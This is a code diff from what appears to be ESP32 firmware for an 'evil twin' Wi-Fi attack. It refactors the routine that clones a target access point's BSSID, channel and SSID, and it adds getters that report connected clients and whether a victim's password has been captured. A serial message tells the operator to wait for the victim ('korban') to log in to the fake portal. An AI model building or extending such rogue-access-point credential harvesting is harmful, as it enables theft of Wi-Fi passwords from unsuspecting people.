@@ -115,9 +115,13 @@ void evil_stop() {
 }
 
 static void evil_start(int idx) {
-  memcpy(s_bssid, s_scan[idx].bssid, 6);
-  s_ch = s_scan[idx].channel;
-  strncpy(s_ssid, s_scan[idx].ssid, sizeof(s_ssid)); s_ssid[sizeof(s_ssid) - 1] = 0;
+  evil_attack(s_scan[idx].bssid, s_scan[idx].channel, s_scan[idx].ssid);
+}
+
+void evil_attack(const uint8_t* bssid, uint8_t ch, const char* ssid) {
+  memcpy(s_bssid, bssid, 6);
+  s_ch = ch;
+  strncpy(s_ssid, ssid, sizeof(s_ssid)); s_ssid[sizeof(s_ssid) - 1] = 0;
   s_pwd[0] = 0; s_verdict = V_NONE;
 
   // bersihkan mode lain
@@ -148,6 +152,12 @@ static void evil_start(int idx) {
   Serial.printf("       portal di http://%s/  — tunggu korban masuk. 'evil stop' utk berhenti\n",
                 apip.toString().c_str());
 }
+
+bool        evil_active()       { return s_state != EV_OFF; }
+int         evil_clients()      { return (s_state != EV_OFF) ? WiFi.softAPgetStationNum() : 0; }
+bool        evil_got_password() { return s_verdict == V_OK; }
+const char* evil_password()     { return s_pwd; }
+const char* evil_ssid()         { return s_ssid; }
 
 void evil_loop() {
   if (s_state == EV_OFF) return;
